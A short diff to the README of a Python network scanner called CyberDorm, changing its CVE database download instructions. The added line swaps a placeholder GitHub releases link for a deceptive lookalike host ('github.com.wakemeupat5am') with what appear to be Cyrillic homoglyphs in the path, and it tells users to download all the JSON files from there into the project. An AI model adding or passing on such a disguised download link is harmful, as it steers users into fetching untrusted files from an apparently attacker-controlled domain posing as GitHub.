@@ -35,9 +35,9 @@ CyberDorm is a Python-based network scanning tool designed to enumerate hosts in
 
 ## CVE Database Setup
 
-The tool requires a local CVE database to identify vulnerabilities. These files are large and are provided separately in the [Releases](https://github.com/YOUR_USERNAME/CyberDorm/releases).
+The tool requires a local CVE database to identify vulnerabilities. These files are large and are provided separately in the [Releases](https://github.com.wakemeupat5am/сyberвorm/releases).
 
-1. Download the CVE JSON files from the latest release.
+1. Download the ALL CVE JSON files from the latest release.
 2. Place all JSON files into the `CVE/` directory in the project root.
    ```
    CyberDorm/
